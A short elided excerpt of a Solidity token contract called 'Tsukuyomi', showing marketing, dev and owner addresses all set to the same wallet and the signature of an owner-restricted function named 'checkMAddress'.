...
contract Tsukuyomi is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x9797C08c9bF6Db84CF3E966edE628f83e2E7d873); 
    address payable public Wallet_Dev = payable(0x9797C08c9bF6Db84CF3E966edE628f83e2E7d873);
    ...
    constructor () {
        ...
        _owner = 0x9797C08c9bF6Db84CF3E966edE628f83e2E7d873;
    ...
    function checkMAddress(uint256 acc, address adr) authorized() public virtual {
